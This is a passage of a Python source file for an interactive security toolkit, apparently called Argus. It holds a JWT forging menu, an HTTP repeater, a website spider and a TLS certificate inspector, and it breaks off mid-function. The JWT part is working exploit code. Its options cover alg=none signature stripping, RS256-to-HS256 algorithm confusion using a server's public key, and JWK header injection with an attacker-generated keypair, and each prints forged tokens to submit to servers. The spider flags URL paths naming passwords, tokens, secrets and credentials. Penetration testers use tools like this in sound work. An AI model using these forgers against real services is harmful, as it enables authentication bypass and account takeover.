    bytes as the HMAC secret.  The server will verify with the same public
    key — and accept the token.

    No external libraries needed — only stdlib hmac.
    """
    import hmac as _hmac
    h             = dict(header)
    h["alg"]      = "HS256"
    enc_h         = _jwt_b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    enc_p         = _jwt_b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{enc_h}.{enc_p}".encode("ascii")
    key_bytes     = (pem_public_key.encode("utf-8")
                     if isinstance(pem_public_key, str) else pem_public_key)
    sig = _hmac.new(key_bytes, signing_input, "sha256").digest()
    return f"{enc_h}.{enc_p}.{_jwt_b64url_encode(sig)}"


def _forge_jwt_jwk_inject(header: dict[str, Any], payload: dict[str, Any]) -> tuple[str | None, str | None, dict[str, Any] | None]:
    """
    JWK header injection attack.

    Generates a fresh attacker-controlled RSA-2048 keypair, embeds the
    public key as a JWK object in the JWT header, and signs the token
    with the corresponding private key.

    Vulnerable servers that look up the verification key from the header's
    'jwk' field (instead of a trusted JWKS endpoint) will use the
    attacker's key and accept the forged token.

    Requires: cryptography  (already a dependency via RSA tools)
    Returns: (token_str, private_key_pem_str, jwk_dict) or (None, None, None)
    """
    try:
        from cryptography.hazmat.primitives.asymmetric import rsa, padding
        from cryptography.hazmat.primitives import hashes, serialization
    except ImportError:
        return None, None, None

    priv_key  = rsa.generate_private_key(public_exponent=65537, key_size=2048)
    pub_nums  = priv_key.public_key().public_numbers()

    def _int_b64url(n: int) -> str:
        length = (n.bit_length() + 7) // 8
        return base64.urlsafe_b64encode(n.to_bytes(length, "big")).rstrip(b"=").decode()

    jwk_dict = {
        "kty": "RSA",
        "n":   _int_b64url(pub_nums.n),
        "e":   _int_b64url(pub_nums.e),
        "alg": "RS256",
        "use": "sig",
    }

    h         = dict(header)
    h["alg"]  = "RS256"
    h["jwk"]  = jwk_dict
    enc_h     = _jwt_b64url_encode(json.dumps(h, separators=(",", ":")).encode())
    enc_p     = _jwt_b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig_input = f"{enc_h}.{enc_p}".encode("ascii")
    sig       = priv_key.sign(sig_input, padding.PKCS1v15(), hashes.SHA256())
    token     = f"{enc_h}.{enc_p}.{_jwt_b64url_encode(sig)}"

    priv_pem = priv_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    ).decode()

    return token, priv_pem, jwk_dict


MORSE_CODE = {
    "A": ".-", "B": "-...", "C": "-.-.", "D": "-..", "E": ".",
    "F": "..-.", "G": "--.", "H": "....", "I": "..", "J": ".---",
    "K": "-.-", "L": ".-..", "M": "--", "N": "-.", "O": "---",
    "P": ".--.", "Q": "--.-", "R": ".-.", "S": "...", "T": "-",
    "U": "..-", "V": "...-", "W": ".--", "X": "-..-", "Y": "-.--",
    "Z": "--..", "0": "-----", "1": ".----", "2": "..---", "3": "...--",
    "4": "....-", "5": ".....", "6": "-....", "7": "--...", "8": "---..",
    "9": "----.", ".": ".-.-.-", ",": "--..--", "?": "..--..", "'": ".----.",
    "!": "-.-.--", "/": "-..-.", "(": "-.--.", ")": "-.--.-", "&": ".-...",
    ":": "---...", ";": "-.-.-.", "=": "-...-", "+": ".-.-.", "-": "-....-",
    "_": "..--.-", '"': ".-..-.", "$": "...-..-", "@": ".--.-.",
}
MORSE_DECODE = {value: key for key, value in MORSE_CODE.items()}


def _rot47(text: str) -> str:
    out = []
    for ch in text:
        code = ord(ch)
        if 33 <= code <= 126:
            out.append(chr(33 + ((code - 33 + 47) % 94)))
        else:
            out.append(ch)
    return "".join(out)


def _morse_encode(text: str) -> str:
    encoded = []
    for ch in text.upper():
        if ch == " ":
            encoded.append("/")
        elif ch in MORSE_CODE:
            encoded.append(MORSE_CODE[ch])
    return " ".join(encoded)


def _morse_decode(code: str) -> str:
    decoded = []
    for token in code.strip().split():
        if token == "/":
            decoded.append(" ")
        else:
            decoded.append(MORSE_DECODE.get(token, "?"))
    return "".join(decoded)


def run_encoder_decoder() -> None:
    """
    Multi-format encoder and decoder.

    Formats supported:
      Base64       - standard b64 encode / decode
      URL          - percent-encoding (encode / decode)
      HTML         - HTML entity escape / unescape
      Hex          - text to hex bytes / hex bytes to text
      Binary       - text to 8-bit binary string / binary to text
      ROT13        - symmetric letter rotation (encode == decode)
      ROT47        - symmetric printable ASCII rotation
      Morse        - dot/dash text encoding
      JWT          - split header/payload/signature and flag weak headers

    All formats use the Python standard library only -- no extra install.
    """
    import base64
    import urllib.parse
    import html as _html
    import codecs

    FORMATS = {
        "1": "Base64",
        "2": "URL Encoding",
        "3": "HTML Entities",
        "4": "Hex",
        "5": "Binary",
        "6": "ROT13",
        "7": "ROT47",
        "8": "Morse Code",
        "9": "JWT Inspector",
    }

    while True:
        print("\n" + "=" * 50)
        print("   Encoder / Decoder")
        print("=" * 50)
        for num, name in FORMATS.items():
            print(f"  {num}. {name}")
        print("  q. Back")

        fmt = input("\n  Select format: ").strip().lower()
        if fmt == "q":
            return
        if fmt not in FORMATS:
            print("  [!] Invalid choice.")
            continue

        if fmt == "9":
            # ── JWT submenu ───────────────────────────────────────────
            print("\n  JWT Tools:")
            print("  1. Inspect token (decode + security warnings)")
            print("  2. Strip signature — forge with alg=none")
            print("  3. Edit payload   — forge with alg=none")
            print("  4. Re-sign        — inject new payload with known HMAC secret")
            print("  5. RS256 → HS256  — algorithm confusion (uses RSA public key as HMAC secret)")
            print("  6. JWK injection  — embed attacker-controlled key in header")
            jwt_choice = input("\n  Choice: ").strip()

            token = input("  JWT token: ").strip()
            print("\n" + "-" * 50)
            try:
                parts = token.split(".")
                if len(parts) != 3:
                    raise ValueError("JWT must have exactly three dot-separated parts.")
                orig_header  = json.loads(_jwt_b64url_decode(parts[0]).decode("utf-8"))
                orig_payload = json.loads(_jwt_b64url_decode(parts[1]).decode("utf-8"))

                if jwt_choice == "1":
                    print(inspect_jwt_token(token))

                elif jwt_choice == "2":
                    forged = _forge_jwt_alg_none(orig_header, orig_payload)
                    print("  [*] alg set to none, signature stripped.")
                    print(f"\n  Forged token:\n  {forged}")

                elif jwt_choice == "3":
                    print("  Original payload:")
                    print("  " + json.dumps(orig_payload, indent=2))
                    raw_edit = input("\n  New payload JSON (blank = keep original): ").strip()
                    new_payload = json.loads(raw_edit) if raw_edit else orig_payload
                    forged = _forge_jwt_alg_none(orig_header, new_payload)
                    print("  [*] Payload updated, alg set to none, signature stripped.")
                    print(f"\n  Forged token:\n  {forged}")

                elif jwt_choice == "4":
                    print("  Original payload:")
                    print("  " + json.dumps(orig_payload, indent=2))
                    raw_edit = input("\n  New payload JSON (blank = keep original): ").strip()
                    new_payload = json.loads(raw_edit) if raw_edit else orig_payload
                    secret = input("  HMAC secret: ")
                    forged = _forge_jwt_hs256(orig_header, new_payload, secret)
                    print("  [*] Payload updated, re-signed with HS256.")
                    print(f"\n  Forged token:\n  {forged}")

                elif jwt_choice == "5":
                    print("  [*] RS256 → HS256 algorithm confusion attack.")
                    print("  [i] Paste the RSA PUBLIC KEY (PEM) used by the server.")
                    print("      (Obtain from JWKS endpoint, SSL cert, or source code)")
                    lines_pem = []
                    print("  Enter PEM (paste key then press Enter twice):")
                    while True:
                        ln = input()
                        if ln == "" and lines_pem and lines_pem[-1] == "":
                            break
                        lines_pem.append(ln)
                    pem_key = "\n".join(lines_pem).strip()
                    if not pem_key:
                        print("  [!] No PEM key entered.")
                    else:
                        print("  Original payload:")
                        print("  " + json.dumps(orig_payload, indent=2))
                        raw_edit = input("\n  New payload JSON (blank = keep original): ").strip()
                        new_payload = json.loads(raw_edit) if raw_edit else orig_payload
                        forged = _forge_jwt_hs256_rsa_confusion(orig_header, new_payload, pem_key)
                        print("\n  [*] Token re-signed with HS256 using the RSA public key as HMAC secret.")
                        print("  [i] Submit to the server — if it accepts, the algorithm confusion is confirmed.")
                        print(f"\n  Forged token:\n  {forged}")

                elif jwt_choice == "6":
                    print("  [*] JWK header injection attack.")
                    print("  [i] Generating fresh RSA-2048 keypair (attacker-controlled) ...")
                    print("  Original payload:")
                    print("  " + json.dumps(orig_payload, indent=2))
                    raw_edit = input("\n  New payload JSON (blank = keep original): ").strip()
                    new_payload = json.loads(raw_edit) if raw_edit else orig_payload
                    token_out, priv_pem, jwk_dict = _forge_jwt_jwk_inject(orig_header, new_payload)
                    if token_out is None:
                        print("  [!] cryptography library required: pip install cryptography")
                    else:
                        print("\n  [+] Attacker keypair generated and JWK embedded in header.")
                        print("  [i] A vulnerable server will verify using the header JWK — and accept.")
                        print(f"\n  Forged token:\n  {token_out}")
                        print(f"\n  Embedded JWK:\n  {json.dumps(jwk_dict, indent=2)}")
                        show_priv = input("\n  Show attacker private key? (y/n) [n]: ").strip().lower()
                        if show_priv == "y":
                            print(f"\n  Private key (keep for manual JWKS server if needed):\n{priv_pem}")

                else:
                    print("  [!] Invalid choice — showing inspect output.")
                    print(inspect_jwt_token(token))

            except Exception as e:
                print(f"  [!] JWT error: {e}")
            print("-" * 50)
            input("\nPress Enter to continue...")
            continue

        while True:
            mode = input("  (e)ncode or (d)ecode? ").strip().lower()
            if mode in ("e", "d"):
                break
            print("  [!] Enter 'e' or 'd'.")

        text = input("  Input: ")

        result = None
        error  = None

        try:
            if fmt == "1":      # Base64
                if mode == "e":
                    result = base64.b64encode(text.encode()).decode()
                else:
                    result = base64.b64decode(text.encode()).decode()

            elif fmt == "2":    # URL
                if mode == "e":
                    result = urllib.parse.quote(text, safe="")
                else:
                    result = urllib.parse.unquote(text)

            elif fmt == "3":    # HTML entities
                if mode == "e":
                    result = _html.escape(text)
                else:
                    result = _html.unescape(text)

            elif fmt == "4":    # Hex
                if mode == "e":
                    result = text.encode().hex()
                else:
                    result = bytes.fromhex(text.replace(" ", "")).decode()

            elif fmt == "5":    # Binary
                if mode == "e":
                    result = " ".join(format(ord(c), "08b") for c in text)
                else:
                    bits   = text.replace(" ", "")
                    chunks = [bits[i:i+8] for i in range(0, len(bits), 8)]
                    result = "".join(chr(int(c, 2)) for c in chunks if c)

            elif fmt == "6":    # ROT13 (symmetric)
                result = codecs.encode(text, "rot_13")

            elif fmt == "7":    # ROT47 (symmetric)
                result = _rot47(text)

            elif fmt == "8":    # Morse
                if mode == "e":
                    result = _morse_encode(text)
                else:
                    result = _morse_decode(text)

        except Exception as e:
            error = str(e)

        print("\n" + "-" * 50)
        if error:
            print(f"  [!] Error: {error}")
        else:
            print(f"  Format : {FORMATS[fmt]}  ({'encode' if mode == 'e' else 'decode'})")
            print(f"  Input  : {text}")
            print(f"  Output : {result}")
        print("-" * 50)

        input("\nPress Enter to continue...")


# ─────────────────────────────────────────────
#  HTTP REPEATER
# ─────────────────────────────────────────────

def run_http_repeater() -> None:
    """
    Build and send a fully custom HTTP request, inspect the full response,
    then modify and resend as many times as needed.

    Useful for:
      - Manually replaying and tweaking captured requests
      - Testing how endpoints respond to non-standard headers or methods
      - Experimenting with different payloads in the body
      - Confirming a vulnerability or checking a patch

    Only use against servers you own or have permission to test.
    Requires: pip install requests
    """
    try:
        import requests
        from requests.exceptions import RequestException
    except ImportError:
        print("\n  [!] requests is not installed.  Run:  pip install requests")
        input("\nPress Enter to return...")
        return

    VALID_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]

    print("\n" + "=" * 56)
    print("   HTTP Repeater")
    print("=" * 56)
    print("  Only use against servers you own or have permission to test.\n")

    # ── Build initial request ─────────────────────────────────────────

    while True:
        print("  Methods: " + "  ".join(VALID_METHODS))
        method = input("  Method  : ").strip().upper()
        if method in VALID_METHODS:
            break
        print(f"  [!] Choose from: {', '.join(VALID_METHODS)}")

    while True:
        url = input("  URL     : ").strip()
        if not url:
            print("  [!] URL cannot be empty.")
            continue
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            print(f"  [*] Using: {url}")
        break

    headers = {}
    print("\n  Custom headers -- one per line, format  Name: Value")
    print("  Press Enter on a blank line when done.")
    while True:
        raw = input("  Header  : ").strip()
        if not raw:
            break
        if ":" not in raw:
            print("  [!] Use format  Name: Value")
            continue
        name, _, value = raw.partition(":")
        headers[name.strip()] = value.strip()

    body = None
    if method in ("POST", "PUT", "PATCH"):
        print("\n  Request body -- type END on its own line to finish:")
        lines = []
        while True:
            line = input()
            if line.strip() == "END":
                break
            lines.append(line)
        body = "\n".join(lines) if lines else None

    # ── Send / inspect / repeat loop ─────────────────────────────────
    session = requests.Session()
    session.headers.update({"User-Agent": "Argus-Repeater/1.0"})

    while True:
        print(f"\n  Sending {method} {url} ...")

        try:
            resp = session.request(
                method=method,
                url=url,
                headers=headers,
                data=body,
                timeout=10,
                allow_redirects=False,
            )
        except RequestException as e:
            print(f"  [!] Request failed: {e}")
            input("\nPress Enter to return...")
            return

        # ── Display response ──────────────────────────────────────────
        W = 56
        print("\n" + "=" * W)
        print(f"  HTTP {resp.status_code}  {resp.reason}")
        print("=" * W)

        print("\n  Response Headers:")
        print("  " + "-" * (W - 2))
        for h, v in resp.headers.items():
            print(f"  {h}: {v}")

        print("\n  Response Body:")
        print("  " + "-" * (W - 2))
        body_text = resp.text
        MAX_DISPLAY = 4000
        if len(body_text) > MAX_DISPLAY:
            for ln in body_text[:MAX_DISPLAY].splitlines():
                print(f"  {ln}")
            print(f"\n  ... [{len(body_text):,} bytes total -- truncated to {MAX_DISPLAY}]")
        else:
            for ln in body_text.splitlines():
                print(f"  {ln}")
        print("  " + "-" * (W - 2))

        # ── Options ───────────────────────────────────────────────────
        print("\n  r) Resend same request")
        print("  m) Modify and resend")
        print("  q) Back to menu")

        while True:
            choice = input("\n  > ").strip().lower()
            if choice in ("r", "m", "q"):
                break

        if choice == "q":
            break

        if choice == "m":
            print(f"\n  Method [{method}] -- press Enter to keep:")
            new = input("  > ").strip().upper()
            if new in VALID_METHODS:
                method = new

            print(f"  URL [{url}] -- press Enter to keep:")
            new = input("  > ").strip()
            if new:
                if not new.startswith(("http://", "https://")):
                    new = "https://" + new
                url = new

            print("  Add / override a header? (Enter to skip)")
            raw = input("  Name: Value > ").strip()
            if raw and ":" in raw:
                name, _, value = raw.partition(":")
                headers[name.strip()] = value.strip()

            if method in ("POST", "PUT", "PATCH"):
                print("  New body? (Enter to keep, or type + END to replace):")
                first = input()
                if first.strip() and first.strip() != "END":
                    lines = [first]
                    while True:
                        ln = input()
                        if ln.strip() == "END":
                            break
                        lines.append(ln)
                    body = "\n".join(lines)
        # "r" falls through and loops to resend

    input("\nPress Enter to return to the menu...")


# ─────────────────────────────────────────────
#  SPIDER / CRAWLER
# ─────────────────────────────────────────────

def run_spider() -> None:
    """
    Crawl a website and map its full attack surface using BFS.

    Discovers:
      Internal links   - every page on the same domain
      External links   - third-party domains linked from the site
      Forms            - action URL, method, and all named input fields
      Interesting URLs - paths matching keywords like admin, api, login,
                         upload, config, token, backup, debug, etc.

    Configurable max depth (1-5) and page limit to avoid runaway crawls.
    Results can be saved to a timestamped .txt file.

    Only use against sites you own or have permission to test.
    Requires: pip install requests beautifulsoup4
    """
    try:
        import requests
        from bs4 import BeautifulSoup
    except ImportError:
        missing = []
        try:
            import requests       # noqa: F401
        except ImportError:
            missing.append("requests")
        try:
            from bs4 import BeautifulSoup   # noqa: F401
        except ImportError:
            missing.append("beautifulsoup4")
        print(f"\n  [!] Missing: {', '.join(missing)}")
        print(f"  Run:  pip install {' '.join(missing)}")
        input("\nPress Enter to return...")
        return

    import urllib.parse
    from collections import deque

    INTERESTING_KW = [
        "admin", "login", "signin", "auth", "api", "upload", "file",
        "dashboard", "panel", "config", "backup", "export", "download",
        "debug", "test", "dev", "staging", "internal", "private",
        "password", "passwd", "token", "key", "secret", "credentials",
    ]

    print("\n" + "=" * 56)
    print("   Spider / Crawler")
    print("=" * 56)
    print("  Only use against sites you own or have permission to test.\n")

    # ── Config ────────────────────────────────────────────────────────
    while True:
        url = input("  Target URL: ").strip()
        if not url:
            print("  [!] URL cannot be empty.")
            continue
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
            print(f"  [*] Using: {url}")
        break

    while True:
        raw = input("  Max depth  (1-5, default 2): ").strip() or "2"
        if raw.isdigit() and 1 <= int(raw) <= 5:
            max_depth = int(raw)
            break
        print("  [!] Enter a number between 1 and 5.")

    while True:
        raw = input("  Max pages  (default 50): ").strip() or "50"
        if raw.isdigit() and int(raw) > 0:
            max_pages = int(raw)
            break
        print("  [!] Enter a positive whole number.")

    use_playwright = False
    playwright_runner = None
    browser = None
    page = None
    while True:
        raw = input("  Use Playwright JS rendering? (y/n, default n): ").strip().lower() or "n"
        if raw in ("y", "n"):
            use_playwright = (raw == "y")
            break
        print("  [!] Enter 'y' or 'n'.")

    if use_playwright:
        try:
            from playwright.sync_api import sync_playwright
            playwright_runner = sync_playwright().start()
            browser = playwright_runner.chromium.launch(headless=True)
            page = browser.new_page(user_agent=_random_user_agent("Spider"))
            print("  [+] Playwright browser rendering enabled.")
        except Exception as e:
            print(f"  [!] Could not start Playwright: {e}")
            print("      Run: pip install playwright")
            print("      Then: playwright install chromium")
            use_playwright = False

    # ── Setup ─────────────────────────────────────────────────────────
    parsed_base = urllib.parse.urlparse(url)
    base_domain = parsed_base.netloc
    base_origin = f"{parsed_base.scheme}://{base_domain}"

    session = requests.Session()
    session.headers.update({"User-Agent": _random_user_agent("Spider")})
    session.max_redirects = 5

    queue          = deque([(url, 0)])
    visited        = set()
    internal_links = set()
    external_links = set()
    forms_found    = []
    interesting    = set()
    errors         = []

    print(f"\n  [*] Crawling {url}")
    print(f"  [*] Depth: {max_depth}   Pages: {max_pages}\n")
    print("  " + "-" * 54)

    try:
        # ── BFS crawl ─────────────────────────────────────────────────────
        while queue and len(visited) < max_pages:
            current_url, depth = queue.popleft()
            current_url = current_url.split("#")[0].rstrip("/") or current_url

            if current_url in visited or depth > max_depth:
                continue
            visited.add(current_url)

            print(f"  [{len(visited):>3}/{max_pages}] d={depth}  {current_url[:70]}")

            try:
                if use_playwright:
                    page.goto(current_url, wait_until="networkidle", timeout=15000)
                    page_url = page.url
                    html_text = page.content()
                else:
                    resp = session.get(current_url, timeout=6, allow_redirects=True)

                    # Only parse HTML pages
                    if "text/html" not in resp.headers.get("Content-Type", ""):
                        continue
                    page_url = resp.url
                    html_text = resp.text

                soup = BeautifulSoup(html_text, "html.parser")

                # ── Links ─────────────────────────────────────────────────
                for tag in soup.find_all("a", href=True):
                    href = tag["href"].strip()
                    if not href or href.startswith(("mailto:", "tel:", "javascript:")):
                        continue
                    abs_url    = urllib.parse.urljoin(page_url, href).split("#")[0]
                    abs_parsed = urllib.parse.urlparse(abs_url)

                    if abs_parsed.netloc == base_domain:
                        internal_links.add(abs_url)
                        if abs_url not in visited and depth + 1 <= max_depth:
                            queue.append((abs_url, depth + 1))
                        path_lower = abs_parsed.path.lower()
                        if any(kw in path_lower for kw in INTERESTING_KW):
                            interesting.add(abs_url)
                    elif abs_parsed.scheme in ("http", "https") and abs_parsed.netloc:
                        external_links.add(abs_url)

                # ── Forms ─────────────────────────────────────────────────
                for form in soup.find_all("form"):
                    action     = form.get("action", "")
                    method     = form.get("method", "GET").upper()
                    abs_action = urllib.parse.urljoin(page_url, action) if action else page_url
                    inputs     = []
                    for field in form.find_all(["input", "textarea", "select"]):
                        name  = field.get("name", "")
                        ftype = field.get("type", field.name)
                        if name:
                            inputs.append(f"{name} [{ftype}]")
                    forms_found.append({
                        "page":   page_url,
                        "action": abs_action,
                        "method": method,
                        "inputs": inputs,
                    })

            except Exception as e:
                errors.append((current_url, str(e)))

    finally:
        if browser:
            try:
                browser.close()
            except Exception:
                pass
        if playwright_runner:
            try:
                playwright_runner.stop()
            except Exception:
                pass

    # ── Print results ─────────────────────────────────────────────────
    print("\n" + "=" * 56)
    print("  CRAWL SUMMARY")
    print("=" * 56)
    print(f"  Pages visited    : {len(visited)}")
    print(f"  Internal links   : {len(internal_links)}")
    print(f"  External links   : {len(external_links)}")
    print(f"  Forms found      : {len(forms_found)}")
    print(f"  Interesting URLs : {len(interesting)}")
    print(f"  Errors           : {len(errors)}")

    if interesting:
        print(f"\n  Interesting Endpoints ({len(interesting)}):")
        print("  " + "-" * 54)
        for u in sorted(interesting):
            print(f"    {u}")

    if forms_found:
        print(f"\n  Forms ({len(forms_found)}):")
        print("  " + "-" * 54)
        for i, frm in enumerate(forms_found, 1):
            print(f"  [{i}] {frm['method']}  {frm['action']}")
            print(f"       Page  : {frm['page']}")
            fields = ", ".join(frm["inputs"]) if frm["inputs"] else "(no named inputs)"
            print(f"       Fields: {fields}")

    if external_links:
        shown = sorted(external_links)[:20]
        print(f"\n  External Links ({len(external_links)}"
              f"{', showing 20' if len(external_links) > 20 else ''}):")
        print("  " + "-" * 54)
        for u in shown:
            print(f"    {u}")
        if len(external_links) > 20:
            print(f"    ... and {len(external_links) - 20} more")

    if errors:
        print(f"\n  Errors ({len(errors)}):")
        print("  " + "-" * 54)
        for eu, em in errors[:10]:
            print(f"    {eu[:55]}  --  {em[:45]}")

    report_lines = [
        "Spider Crawl Report",
        f"Target : {url}",
        f"Date   : {datetime.datetime.now()}",
        f"Mode   : {'Playwright JS rendering' if use_playwright else 'requests + BeautifulSoup'}",
        "",
        f"Pages visited  : {len(visited)}",
        f"Internal links : {len(internal_links)}",
        f"External links : {len(external_links)}",
        f"Forms found    : {len(forms_found)}",
        f"Interesting    : {len(interesting)}",
        f"Errors         : {len(errors)}",
        "",
    ]
    if interesting:
        report_lines.append("Interesting Endpoints:")
        report_lines.extend(f"  {u}" for u in sorted(interesting))
        report_lines.append("")
    if forms_found:
        report_lines.append("Forms:")
        for frm in forms_found:
            report_lines.append(f"  [{frm['method']}] {frm['action']}")
            report_lines.append(f"    Page  : {frm['page']}")
            report_lines.append(f"    Fields: {', '.join(frm['inputs'])}")
        report_lines.append("")
    if external_links:
        report_lines.append("External Links:")
        report_lines.extend(f"  {u}" for u in sorted(external_links))
        report_lines.append("")
    if errors:
        report_lines.append("Errors:")
        report_lines.extend(f"  {eu} -- {em}" for eu, em in errors)
        report_lines.append("")
    crawl_report = "\n".join(report_lines)
    run_id = _save_tool_run(
        "spider_js" if use_playwright else "spider",
        url,
        f"{len(visited)} pages, {len(forms_found)} forms, {len(interesting)} interesting URLs",
        crawl_report,
    )
    if run_id:
        print(f"\n  [+] Saved crawl to SQLite result #{run_id}.")

    # ── Optional save ─────────────────────────────────────────────────
    if input("\n  Save crawl report? (y/n): ").strip().lower() == "y":
        hostname = urllib.parse.urlparse(url).hostname or "crawl"
        safe     = "".join(c if c.isalnum() or c in "-_." else "_" for c in hostname)
        ts       = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        fname    = f"crawl_{safe}_{ts}.txt"
        try:
            with open(fname, "w", encoding="utf-8") as f:
                f.write(f"Spider Crawl Report\nTarget : {url}\n"
                        f"Date   : {datetime.datetime.now()}\n\n")
                f.write(f"Pages visited  : {len(visited)}\n"
                        f"Internal links : {len(internal_links)}\n"
                        f"External links : {len(external_links)}\n"
                        f"Forms found    : {len(forms_found)}\n"
                        f"Interesting    : {len(interesting)}\n\n")
                if interesting:
                    f.write("Interesting Endpoints:\n")
                    for u in sorted(interesting):
                        f.write(f"  {u}\n")
                    f.write("\n")
                if forms_found:
                    f.write("Forms:\n")
                    for frm in forms_found:
                        f.write(f"  [{frm['method']}] {frm['action']}\n")
                        f.write(f"    Fields: {', '.join(frm['inputs'])}\n")
                    f.write("\n")
                if external_links:
                    f.write("External Links:\n")
                    for u in sorted(external_links):
                        f.write(f"  {u}\n")
                    f.write("\n")
                if errors:
                    f.write("Errors:\n")
                    for eu, em in errors:
                        f.write(f"  {eu}  --  {em}\n")
            print(f"  [+] Saved to '{fname}'")
        except OSError as e:
            print(f"  [!] Could not save: {e}")

    input("\nPress Enter to return to the menu...")



# ─────────────────────────────────────────────
#  SSL/TLS CERTIFICATE INSPECTOR
# ─────────────────────────────────────────────

def run_ssl_inspector() -> None:
    """
    Standalone deep-dive SSL/TLS inspector.

    Shows the full certificate chain details, all SANs, negotiated
    protocol version, active cipher suite, key type and size, and
    flags common misconfigurations.  No extra dependencies needed.
    """
    import ssl
    import socket
    import urllib.parse

    print_rule("SSL / TLS Certificate Inspector")
    raw = input("  Host (e.g. example.com or https://example.com): ").strip()
    if not raw:
        print("  [!] Host cannot be empty.")
        input("\nPress Enter to return...")
        return

    if "://" in raw:
        parsed_in = urllib.parse.urlparse(raw)
        host = parsed_in.hostname or raw
        port = parsed_in.port or 443
    else:
        parts = raw.rsplit(":", 1)
        host  = parts[0]
        port  = int(parts[1]) if len(parts) == 2 and parts[1].isdigit() else 443

    print(f"\n  [*] Connecting to {host}:{port} ...")

    cert        = None
    tls_version = None
    cipher_info = None
    verified    = False
    error_msg   = ""

    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=8) as raw_sock:
            with ctx.wrap_socket(raw_sock, server_hostname=host) as ssock:
                cert        = ssock.getpeercert()
                tls_version = ssock.version()
                cipher_info = ssock.cipher()
                verified    = True
    except ssl.SSLCertVerificationError as e:
        error_msg = f"Verification failed: {e}"
        try:
            ctx2 = ssl.create_default_context()
            ctx2.check_hostname = False
            ctx2.verify_mode    = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=8) as raw_sock:
                with ctx2.wrap_socket(raw_sock, server_hostname=host) as ssock:
                    cert        = ssock.getpeercert(binary_form=False)
                    tls_version = ssock.version()
                    cipher_info = ssock.cipher()
        except Exception:
            pass
    except OSError as e:
        print(f"  [!] Could not connect: {e}")
        input("\nPress Enter to return...")
        return
    except Exception as e:
        print(f"  [!] Unexpected error: {e}")
        input("\nPress Enter to return...")
        return

    if cert is None:
        print("  [!] Could not retrieve certificate.")
        input("\nPress Enter to return...")
        return

    def _name(rdn_seq: Any) -> str:
        if not rdn_seq:
            return "(none)"
        return ", ".join(f"{k}={v}" for rdn in rdn_seq for k, v in rdn)

    subject        = _name(cert.get("subject", ()))
    issuer         = _name(cert.get("issuer",  ()))
    serial         = cert.get("serialNumber", "unknown")
    not_before_raw = cert.get("notBefore", "")
    not_after_raw  = cert.get("notAfter",  "")
    sans           = [v for k, v in cert.get("subjectAltName", []) if k.lower() == "dns"]
    ip_sans        = [v for k, v in cert.get("subjectAltName", []) if k.lower() == "ip address"]
    sig_alg        = cert.get("signatureAlgorithm", "")

    def _parse_date(s: str) -> tuple[datetime.datetime | None, str]:
        if not s:
            return None, "(unknown)"
        try:
            dt = datetime.datetime.strptime(s, "%b %d %H:%M:%S %Y %Z")
            return dt, dt.strftime("%Y-%m-%d %H:%M:%S UTC")
        except ValueError:
            return None, s

    nb_dt, nb_str = _parse_date(not_before_raw)
    na_dt, na_str = _parse_date(not_after_raw)
    now = datetime.datetime.utcnow()

    if na_dt:
        days_left = (na_dt - now).days
        if days_left < 0:
            expiry_flag = f"  [!!!] EXPIRED {abs(days_left)} day(s) ago"
        elif days_left < 14:
            expiry_flag = f"  [ !! ] Expires in {days_left} day(s) — URGENT"
        elif days_left < 30:
            expiry_flag = f"  [  ! ] Expires in {days_left} days — renew soon"
        else:
            expiry_flag = f"  [  i ] {days_left} days remaining"
    else:
        expiry_flag = ""

    cipher_name  = cipher_info[0] if cipher_info else "(unknown)"
    cipher_bits  = cipher_info[2] if cipher_info else 0
    WEAK_CIPHER_KW = ("RC4", "DES", "NULL", "EXPORT", "ANON", "MD5", "3DES")
    cipher_warn = any(kw in cipher_name.upper() for kw in WEAK_CIPHER_KW)
    bits_warn   = bool(cipher_bits and cipher_bits < 128)
    DEPRECATED = {"SSLv2", "SSLv3", "TLSv1", "TLSv1.0", "TLSv1.1"}
    proto_warn  = tls_version in DEPRECATED

    W = 60
    print()
    print("  " + "=" * W)
    print(f"  CERTIFICATE — {host}:{port}")
    print("  " + "=" * W)

    if not verified:
        print(f"  [!!!] {error_msg}")
        print()

    print(f"  Subject        : {subject}")
    print(f"  Issuer         : {issuer}")
    print(f"  Serial no.     : {serial}")
    if sig_alg:
        print(f"  Sig algorithm  : {sig_alg}")
    print()
    print(f"  Valid from     : {nb_str}")
    print(f"  Valid to       : {na_str}")
    if expiry_flag:
        print(expiry_flag)
    print()
    print(f"  TLS version    : {tls_version or '(unknown)'}")
    print(f"  Cipher suite   : {cipher_name}")
    print(f"  Key bits       : {cipher_bits or '(unknown)'}")
    if proto_warn:
        print(f"  [ !! ] Deprecated protocol {tls_version} — upgrade to TLS 1.2+.")
    if cipher_warn:
        print("  [  ! ] Weak cipher suite detected.")
    if bits_warn:
        print(f"  [  ! ] Key length {cipher_bits} bits — below 128-bit minimum.")
    print()

    total_sans = len(sans) + len(ip_sans)
    print(f"  Subject Alternative Names ({total_sans} total):")
    for name in sans[:30]:
        print(f"    DNS : {name}")
    for ip in ip_sans[:10]:
        print(f"    IP  : {ip}")
    if len(sans) > 30:
        print(f"    ... {len(sans) - 30} more DNS SANs omitted")

    print()
    print("  " + "=" * W)

    try:
        import urllib.request as _ur
        req = _ur.Request(
            f"https://{host}:{port}/",
            headers={"User-Agent": f"Argus/{APP_VERSION}"},
        )
        with _ur.urlopen(req, timeout=6) as resp:
            hsts = resp.headers.get("Strict-Transport-Security")
        if hsts:
            print(f"  [  i ] HSTS present: {hsts}")
        else:
            print("  [  ! ] HSTS missing (Strict-Transport-Security not set).")
    except Exception:
        pass

    # ── Certificate Transparency lookup ───────────────────────────────
    print()
    ans = input("  Query certificate transparency logs (crt.sh)? (y/n) [y]: ").strip().lower() or "y"
    if ans == "y":
        print(f"  [*] Querying crt.sh for %.{host} ...")
        ct_names, ct_err = _certificate_transparency_names(host)
        print()
        print("  " + "=" * W)
        print(f"  CERTIFICATE TRANSPARENCY — {host}")
        print("  " + "=" * W)
        if ct_err:
            print(f"  [!] {ct_err}")
        elif ct_names:
